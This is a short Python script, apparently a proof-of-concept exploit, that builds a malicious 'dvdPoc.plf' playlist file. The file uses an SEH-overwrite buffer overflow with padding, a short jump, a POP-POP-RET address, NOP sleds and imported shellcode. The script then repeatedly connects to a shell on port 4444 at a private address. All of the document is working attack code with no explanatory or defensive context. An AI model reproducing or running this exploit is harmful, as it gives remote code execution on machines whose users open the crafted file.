from utils import interactive_shell
import pwn
from utils import shellcode_calc,shellcode2

seh=pwn.p32(0x6164172e)#POPOPRET

jmp_next_6=b"\xEB\x06\x90\x90"
print(len(shellcode_calc))
buffer = b"A"*608 + jmp_next_6 +seh + b"\x90"*8+shellcode2+b"\x90"*8+b"C"*(1002-608-4-4-len(shellcode2)-8*2)

filename = "dvdPoc.plf"
textfile = open(filename, 'wb')
textfile.write(buffer)
textfile.close()

while True:
    try:
        interactive_shell('192.168.58.135', 4444)
    except Exception as e:
        print(e)
        pass

